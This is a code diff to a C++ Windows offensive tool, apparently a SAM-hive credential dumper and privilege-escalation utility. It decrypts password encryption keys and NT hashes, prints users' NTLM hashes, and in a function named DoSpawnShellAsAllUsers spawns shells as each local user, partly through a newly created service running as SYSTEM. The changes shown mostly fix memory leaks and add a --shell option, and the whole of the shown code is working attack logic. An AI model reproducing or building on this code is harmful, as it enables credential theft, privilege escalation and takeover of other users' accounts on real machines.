@@ -1914,8 +1914,6 @@ bool ComputeSHA256(char* data, int size, char hashout[SHA256_DIGEST_LENGTH])
 {
 
 
-	char* data2 = (char*)malloc(SHA256_DIGEST_LENGTH);
-	ZeroMemory(data2, SHA256_DIGEST_LENGTH);
 	HCRYPTPROV hprov = NULL;
 	CryptAcquireContext(&hprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
 	HCRYPTHASH Hhash = NULL;
@@ -1963,25 +1961,31 @@ void* UnprotectPasswordEncryptionKeyAES(char* data, char* lsaKey, int* keysz)
 	int outsz = 0;
 	int pekoutsz = 0;
 	char* pek = (char*)UnprotectAES(lsaKey, iv, cyphertext, enclen, &pekoutsz);
+	free(cyphertext);
 
 	char* hashdata = (char*)malloc(hashlen);
 	memmove(hashdata, &data[0x18 + enclen], hashlen);
 
 	char* hash = (char*)UnprotectAES(lsaKey, iv, hashdata, hashlen, &outsz);
-
+	free(hashdata);
 
 	char hash256[SHA256_DIGEST_LENGTH];
 
 	if (!ComputeSHA256(pek, pekoutsz, hash256))
 	{
+		free(hash);
+		free(pek);
 		return NULL;
 	}
 
 	if (memcmp(hash256, hash, sizeof(hash256)) != 0)
 	{
 		printf("Invalid AES password key.\n");
+		free(hash);
+		free(pek);
 		return NULL;
 	}
+	free(hash);
 	if (keysz)
 		*keysz = sizeof(hash256);
 
@@ -2001,7 +2005,7 @@ void* UnprotectPasswordEncryptionKey(char* samKey, unsigned char* lsaKey, int* k
 		char* data = (char*)malloc(len);
 		memmove(data, &samKey[0x70], len);
 		void* retval = UnprotectPasswordEncryptionKeyAES(data, (char*)lsaKey, keysz);
-
+		free(data);
 		return retval;
 	}
 	__debugbreak();
@@ -2020,7 +2024,9 @@ void* UnprotectPasswordHashAES(char* key, int keysz, char* data, int datasz, int
 	int ciphertextsz = datasz - 24;
 	char* ciphertext = (char*)malloc(ciphertextsz);
 	memmove(ciphertext, &data[8 + sizeof(iv)], ciphertextsz);
-	return UnprotectAES(key, iv, ciphertext, ciphertextsz, outsz);
+	void* result = UnprotectAES(key, iv, ciphertext, ciphertextsz, outsz);
+	free(ciphertext);
+	return result;
 }
 
 void* UnprotectPasswordHash(char* key, int keysz, char* data, int datasz, ULONG rid, int* outsz)
@@ -2174,15 +2180,25 @@ void* UnproctectPasswordHashDES(char* ciphertext, int ciphersz, int* outsz, ULON
 	int plaintext1sz = 0;
 	int plaintext2sz = 0;
 	char* plaintext1 = (char*)UnprotectDES(rkey1, sizeof(key1), ciphertext, ciphersz, &plaintext1sz);
+	free(rkey1);
 	if (!plaintext1)
+	{
+		free(rkey2);
 		return NULL;
+	}
 	char* plaintext2 = (char*)UnprotectDES(rkey2, sizeof(key2), &ciphertext[8], ciphersz, &plaintext2sz);
+	free(rkey2);
 	if (!plaintext2)
+	{
+		free(plaintext1);
 		return NULL;
+	}
 	void* retval = malloc(plaintext1sz + plaintext2sz);
 
 	memmove(retval, plaintext1, plaintext1sz);
 	memmove(RtlOffsetToPointer(retval, plaintext1sz), plaintext2, plaintext2sz);
+	free(plaintext1);
+	free(plaintext2);
 	if (outsz)
 		*outsz = plaintext1sz + plaintext2sz;
 	return retval;
@@ -2196,6 +2212,7 @@ void* UnprotectNTHash(char* key, int keysz, char* encryptedHash, int enchashsz, 
 		return NULL;
 	int _hashoutsz = 0;
 	void* _hash = UnproctectPasswordHashDES((char*)dec, _outsz, &_hashoutsz, rid);
+	free(dec);
 	if (outsz)
 		*outsz = _hashoutsz;
 	return _hash;
@@ -2274,19 +2291,7 @@ char* CalculateNTLMHash(char* _input)
 
 	CryptDestroyHash(Hhash);
 	CryptReleaseContext(hprov, NULL);
-	/*
-	EVP_MD_CTX* mdctx = EVP_MD_CTX_new();
-	EVP_DigestInit_ex(mdctx, EVP_md4(), NULL);
-	EVP_DigestUpdate(mdctx, input, pw_len * 2);
-	EVP_DigestFinal_ex(mdctx, md_value, &md_len);
-	EVP_MD_CTX_free(mdctx);
-	*/
-	/*
-	printf("Digest is: ");
-	for (int i = 0; i < md_len; i++)
-		printf("%02x", md_value[i]);
-	printf("\n");
-	*/
+	delete[] input;
 	return (char*)md_value;
 
 }
@@ -2660,6 +2665,8 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 		}
 		printf("******************************************\n");
 		printf("    User : %ws\n    RID : %d\n    NTLM : %s\n", username, samentry->rid, stringntlm);
+		if (stringntlm && stringntlm != emptyrepresentation)
+			free(stringntlm);
 		if (realNTLMHash == NULL || realNTLMHashsz == 0) {
 			printf("    Skip : NULL NTLM.\n");
 			continue;
@@ -2667,11 +2674,13 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 		if (_wcsicmp(username, currentusername) == 0)
 		{
 			printf("    Skip : Current User.\n");
+			free(realNTLMHash);
 			continue;
 		}
 		if (_wcsicmp(username, L"WDAGUtilityAccount") == 0)
 		{
 			printf("    Skip : WDAGUtilityAccount detected.\n");
+			free(realNTLMHash);
 			continue;
 		}
 		
@@ -2774,7 +2783,8 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 						wchar_t servicecmd[MAX_PATH] = { 0 };
 						DWORD currentsesid = 0;
 						ProcessIdToSessionId(GetCurrentProcessId(), &currentsesid);
-						wsprintf(servicecmd, L"\"%s\" %d", binpath, currentsesid);
+						bool useShell = _wcsicmp(g_ShellBinary, L"C:\\Windows\\System32\\cmd.exe") == 0;
+						wsprintf(servicecmd, useShell ? L"\"%s\" %d --shell" : L"\"%s\" %d", binpath, currentsesid);
 
 						SC_HANDLE hsvc = CreateService(hmgr, wuid2, wuid2, GENERIC_ALL, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, servicecmd, NULL, NULL, NULL, NULL, NULL);
 						if (!hsvc)
@@ -2803,7 +2813,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 
 				STARTUPINFO si = { 0 };
 				PROCESS_INFORMATION pi = { 0 };
-				if (!CreateProcessWithLogonW(username, NULL, newpassword_unistr, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi))
+				if (!CreateProcessWithLogonW(username, NULL, newpassword_unistr, LOGON_WITH_PROFILE, g_ShellBinary, NULL, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi))
 				{
 					printf("    Shell : Error %d\n", GetLastError());
 				}
@@ -2828,10 +2838,25 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 			
 			// __debugbreak();
 
+			free(realNTLMHash);
 
-		
+
 	}
 
+	// Clean up SAM parsing allocations
+	for (int i = 0; i < numofentries; i++)
+	{
+		if (pwdenclist[i])
+		{
+			free(pwdenclist[i]->buff);
+			free(pwdenclist[i]);
+		}
+	}
+	free(pwdenclist);
+	free(samkey);
+	free(passwordEncryptionKey);
+
+	ORCloseKey(hkey);
 	ORCloseHive(hSAMhive);
 	printf("******************************************\n");
 	free(newNTLM);
@@ -2885,7 +2910,7 @@ void LaunchConsoleInSessionId(DWORD sessionid)
 
 	STARTUPINFO si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
-	CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+	CreateProcessAsUser(hnewtoken, g_ShellBinary, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
 
 	CloseHandle(hnewtoken);
 
@@ -2897,20 +2922,38 @@ void LaunchConsoleInSessionId(DWORD sessionid)
 
 }
 
+// Global shell binary — set by --shell flag
+const wchar_t* g_ShellBinary = L"C:\\Windows\\System32\\conhost.exe";
+
 int wmain(int argc, wchar_t* argv[])
 {
 
-	
+	// Parse --shell flag early (needed by both SYSTEM service path and normal path)
+	for (int i = 1; i < argc; i++)
+	{
+		if (_wcsicmp(argv[i], L"--shell") == 0)
+		{
+			g_ShellBinary = L"C:\\Windows\\System32\\cmd.exe";
+		}
+	}
+
 	if (IsRunningAsLocalSystem())
 	{
 		printf("Running as local system.\n");
-		if (argc == 2)
+		DWORD sessionid = 0;
+		for (int i = 1; i < argc; i++)
 		{
-			DWORD sessionid = _wtoi(argv[1]);
-			if (sessionid) {
-				printf("Session id : %d\n", sessionid);
-				LaunchConsoleInSessionId(sessionid);
+			// Session ID is a numeric argument
+			DWORD val = _wtoi(argv[i]);
+			if (val > 0) {
+				sessionid = val;
+				break;
 			}
+		}
+		if (sessionid) {
+			printf("Session id : %d\n", sessionid);
+			printf("Shell binary : %ws\n", g_ShellBinary);
+			LaunchConsoleInSessionId(sessionid);
 		}
 		return 0;
 	}
